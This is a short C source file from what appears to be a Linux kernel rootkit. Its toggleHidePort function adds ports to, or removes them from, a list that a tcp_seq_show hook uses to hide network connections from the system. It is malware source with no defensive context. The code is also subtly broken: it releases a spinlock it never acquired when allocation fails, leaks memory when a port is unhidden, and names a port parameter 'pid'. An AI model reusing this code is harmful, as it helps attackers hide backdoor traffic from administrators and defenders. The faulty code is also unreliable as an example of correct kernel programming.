#include "../include_modules/hide_port.h"
#include "../include/core.h"
#include "../include_hooks/tcp_seq_show.h"

void toggleHidePort(unsigned short pid) {
    struct hidden_ports *pos;
    struct hidden_ports *found = NULL;

    struct hidden_ports *newPort = kzalloc(sizeof(*newPort), GFP_KERNEL);
    if (!newPort) {
        spin_unlock(&hidden_ports_lock);
        return;
    }

    spin_lock(&hidden_ports_lock);

    list_for_each_entry(pos, &hidden_ports_list, list) {
        if (pos->port == pid) {
            found = pos;
            break;
        }
    }

    if (!found) {
        newPort->port = pid;
        list_add(&newPort->list, &hidden_ports_list);

    } else {
        list_del(&found->list);
        kfree(found);
    }

    spin_unlock(&hidden_ports_lock);
};
